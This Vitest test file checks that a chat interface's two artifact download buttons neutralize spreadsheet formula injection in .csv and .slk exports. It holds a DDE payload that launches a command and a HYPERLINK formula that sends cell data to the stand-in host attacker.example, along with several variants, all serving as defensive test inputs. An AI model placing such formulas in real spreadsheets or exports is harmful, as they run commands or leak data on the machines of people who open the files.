/**
 * The two artifact download sinks that are NOT ArtifactRenderer: the DownloadCard
 * button under every assistant message (MessageBubble) and the panel's own
 * Download control (ArtifactPanel). Both used to write artifact.content verbatim
 * into `<title>.${artifact.language}`, so a ```csv fence carrying the artifact
 * marker landed an unneutralized formula in a .csv file.
 *
 * @vitest-environment jsdom
 */
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { cleanup, fireEvent, render, screen } from '@testing-library/react';
import { ArtifactPanel } from '../ArtifactPanel';
import { MessageBubble } from '../MessageBubble';
import type { Artifact, ChatMessage, MessageArtifactProjection } from '../../lib/types';

vi.mock('../artifact-components/ReactPreview', () => ({
  ReactPreview: () => <div data-testid="stub-react-preview" />,
  buildReactPreviewDocument: vi.fn(),
}));

interface CapturedDownload {
  fileName: string;
  body: string;
  mime: string;
}

const captured: CapturedDownload[] = [];

beforeEach(() => {
  captured.length = 0;
  const RealBlob = globalThis.Blob;
  let pending: { body: string; mime: string } | null = null;
  class RecordingBlob extends RealBlob {
    constructor(parts: BlobPart[] = [], options?: BlobPropertyBag) {
      super(parts, options);
      pending = { body: parts.map(String).join(''), mime: options?.type ?? '' };
    }
  }
  vi.stubGlobal('Blob', RecordingBlob);
  URL.createObjectURL = vi.fn(() => 'blob:artifact-sink-test');
  URL.revokeObjectURL = vi.fn();
  vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(function (
    this: HTMLAnchorElement,
  ) {
    if (pending) captured.push({ fileName: this.download, ...pending });
    pending = null;
  });
});

afterEach(() => {
  cleanup();
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
});

const DDE = "=cmd|'/c calc'!A0";
const HYPERLINK = '=HYPERLINK("http://attacker.example/steal?u="&A1)';

function artifact(overrides: Partial<Artifact> = {}): Artifact {
  return {
    id: 'art-1',
    type: 'code',
    title: 'Q3 report',
    content: `victim,${HYPERLINK}`,
    language: 'csv',
    ...overrides,
  };
}

function assistantMessage(): ChatMessage {
  return { id: 'm1', role: 'assistant', content: 'Here is the export.' };
}

function lastDownload(): CapturedDownload {
  const last = captured[captured.length - 1];
  expect(last).toBeDefined();
  return last!;
}

function downloadFromBubble(a: Artifact): CapturedDownload {
  const projection: MessageArtifactProjection = { artifacts: [a], displayContent: 'body' };
  render(<MessageBubble message={assistantMessage()} artifactProjection={projection} />);
  fireEvent.click(screen.getByLabelText('Download artifact'));
  return lastDownload();
}

function downloadFromPanel(a: Artifact): CapturedDownload {
  render(
    <ArtifactPanel artifact={a} viewMode="code" onViewModeChange={() => {}} onClose={() => {}} />,
  );
  fireEvent.click(screen.getByLabelText('More options'));
  fireEvent.click(screen.getByText('Download'));
  return lastDownload();
}

const sinks: Array<[string, (a: Artifact) => CapturedDownload]> = [
  ['MessageBubble DownloadCard', downloadFromBubble],
  ['ArtifactPanel Download', downloadFromPanel],
];

describe.each(sinks)('%s', (_label, download) => {
  it('neutralizes a formula in a code artifact whose language names it .csv', () => {
    const file = download(artifact());

    expect(file.fileName).toBe('q3-report.csv');
    expect(file.body).toContain("'=HYPERLINK");
    expect(file.body).not.toContain(`,${HYPERLINK}`);
    expect(file.mime).toBe('text/csv;charset=utf-8;');
  });

  it('neutralizes a DDE payload the table parser rejects', () => {
    const file = download(artifact({ content: DDE }));

    expect(file.body).not.toBe(DDE);
    expect(file.body.replace(/^"/, '')).toMatch(/^'/);
  });

  it('neutralizes a SYLK export, a text format Excel evaluates', () => {
    const file = download(artifact({ content: DDE, language: 'slk' }));

    expect(file.fileName).toBe('q3-report.slk');
    expect(file.body).not.toBe(DDE);
    expect(file.body.replace(/^"/, '')).toMatch(/^'/);
  });

  it('writes a spreadsheet artifact through the neutralizer too', () => {
    const file = download(artifact({ type: 'spreadsheet', language: 'csv', content: DDE }));

    expect(file.fileName).toBe('q3-report.csv');
    expect(file.body).not.toBe(DDE);
  });

  it('names a spreadsheet artifact .csv even when the model set no language', () => {
    const file = download(artifact({ type: 'spreadsheet', language: undefined, content: DDE }));

    expect(file.fileName).toBe('q3-report.csv');
    expect(file.body).toBe(`'${DDE}`);
  });

  it('leaves a benign table byte-identical', () => {
    const content = 'name,score\nAlice,30\nBob,-7';
    const file = download(artifact({ content }));

    expect(file.body).toBe(content);
  });

  it('guards the record a lone CR starts', () => {
    const file = download(artifact({ content: `victim,1\r${HYPERLINK}` }));

    expect(file.body).toBe(`victim,1\r'${HYPERLINK}`);
  });

  it('guards a payload a leading number is glued to', () => {
    const content = "victim,note\n-1,2+cmd|'/c calc'!A0";
    const file = download(artifact({ content }));

    expect(file.body).not.toBe(content);
    expect(file.body).toBe("victim,note\n'-1,2+cmd|'/c calc'!A0");
  });

  it('guards a tab-delimited artifact written under a .csv name', () => {
    const file = download(artifact({ content: `victim\t${DDE}` }));

    expect(file.body).toBe(`victim\t'${DDE}`);
  });

  it.each([
    [
      'a blank header, ragged rows, CRLF and a trailing blank row',
      'name,,city\r\nA,B\r\n1,2,3,4\r\n\r\n',
    ],
    ['a semicolon locale and padded headers', ' name ; score \nAlice;30\n'],
  ])('exports %s exactly as the model wrote it', (_shape, content) => {
    expect(download(artifact({ content })).body).toBe(content);
  });

  it('leaves a non-spreadsheet artifact untouched', () => {
    const file = download(artifact({ type: 'markdown', language: undefined, content: '=1+1' }));

    expect(file.fileName).toBe('q3-report.md');
    expect(file.body).toBe('=1+1');
    expect(file.mime).toBe('text/plain');
  });
});
